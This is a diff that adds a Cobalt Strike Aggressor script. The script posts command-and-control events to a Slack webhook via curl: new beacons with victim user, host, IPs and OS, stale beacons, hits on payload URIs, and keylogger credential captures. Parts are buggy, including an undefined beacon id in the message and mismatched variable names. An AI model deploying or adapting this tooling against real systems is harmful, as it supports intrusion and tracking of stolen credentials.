@@ -1,0 +1,100 @@
+# Author @sec_groundzero. Based on the work of @bluescreenofjeff
+
+$slack_channel = "#cobaltstrike-events";
+$slack_emoji = ':skeleton:';
+$slack_webhookURL = 'https://hooks.slack.com/services/xxxxx/xxxxx/xxxxx';
+
+$teamserver_hostname = 'Main-C2-Server';
+
+# send a checkin message, so can verify the script and slack bot is working properly.
+$checkin_message = 'The aggressor script loaded successfully, also the slack bot is working properly!';
+@curl_command = @('curl','-X','POST','-H','Content-type: application/json', '--data','{"text":"' .$checkin_message .'"}', $slack_webhookURL);
+exec(@curl_command);
+
+#URIs to notify on
+#(ignores the query string)
+$target-uris = @('/1by1pixel.jpg', '/heres/my/payload');
+
+$message = "\n------msg------\n" . 
+"teamserver_name: " . $teamserver_name  . "\n" .
+"\n\n"  . "\n" .
+"beacon id : " .beacon_info($one_bid, "id") . "\n" . 
+"beacon note : " . beacon_info($one_bid, "note") . "\n" . 
+"computer name : " . beacon_info($one_bid, "computer") . "\n" .
+beacon_info($one_bid, "note") . "\n" .
+"User : " .beacon_info($one_bid, "user") . "\n" .
+"PID : " . beacon_info($one_bid, "pid") . "\n" .
+"host : " . beacon_info($one_bid, "host") . "\n" .
+"external IP : " . beacon_info($one_bid, "external") . "\n" .
+"internal IP : " . beacon_info($one_bid, "internal") . "\n" .
+"port : " . beacon_info($one_bid, "port") . "\n" .
+"os : " . beacon_info($one_bid, "os") . "\n" .
+"ver : " . beacon_info($one_bid, "ver") . "\n" .
+"barch : " . beacon_info($one_bid, "barch") . "\n" .
+"is64 : " . beacon_info($one_bid, "is64") . "\n" .
+"charset : " . beacon_info($one_bid, "charset") . "\n" .
+"pbid : " . beacon_info($one_bid, "pbid") . "\n" .
+"phint : " . beacon_info($one_bid, "phint") . "\n" .
+"alive : " . beacon_info($one_bid, "alive") . "\n" .
+"last : " . beacon_info($one_bid, "last"). "\n" .
+"lastf : " . beacon_info($one_bid, "lastf"). "\n------end------\n";
+
+on beacon_initial {
+        @curl_command = @('curl','-X','POST','-H','Content-type: application/json', '--data','{"text":"' .$message .'"}',$slack_webhookURL);
+        exec(@curl_command);
+}
+
+
+# default stale value of 5 minutes (300000ms)
+$stale_time = 600000;
+
+#modify line 16 as needed with the heartbeat events (https://www.cobaltstrike.com/aggressor-script/events.html#heartbeat_10m)
+
+on heartbeat_30m {
+    foreach $beacon (beacons()) {
+        if (($beacon["last"] > $stale_time) && ($beacon["pbid"] eq '')) {
+            $last_checkin = $beacon["last"] / 1000;
+            println("There is a stale beacon on ' . $teamserver_hostname . ' that hasn\'t checked in for ' . $last_checkin . ' seconds.");
+            #@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Notifier Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"There is a stale beacon on ' . $teamserver_hostname . ' that hasn\'t checked in for ' . $last_checkin . ' seconds. "}',$slack_webhookURL);
+            #exec(@curl_command);	
+        }
+    }
+}
+
+#onload message
+@curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Notifier Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"Server ' . $teamserver_hostname . ' will alert on Beacons that haven\'t checked in for ' . $stale_time . ' seconds. "}',$slack_webhookURL);
+exec(@curl_command);
+
+
+
+on ready {
+        @curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"CS Client Connected"}',$slack_webhookURL);
+        exec(@curl_command);
+}
+
+on web_hit {
+    if ($2 in $target-uris) {
+        @curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"Web hit from ' . $3 . '. to URI ' . $2 .'"}', $slack_webhookURL);
+        exec(@curl_command);
+    }
+}
+
+on disconnect {
+        @curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"CS Client Disconnected"}',$slack_webhookURL);
+        exec(@curl_command);
+}
+
+
+on event_public {
+        @curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":" ' . $1 . ' posted: ' . $2 .'"}',$slack_webhookURL);
+        exec(@curl_command);
+}
+
+
+on keylogger_hit {
+
+        @curl_command = @('curl','-X','POST','--data-urlencode','payload={"username": "Cobalt Strike Bot", "icon_emoji": "' . $slack_emoji. '", "channel": "' . $slack_channel . '", "text":"Keylog creds from ' . $2 . '"}',$slack_webhookURL);
+        exec(@curl_command);
+}
+
+
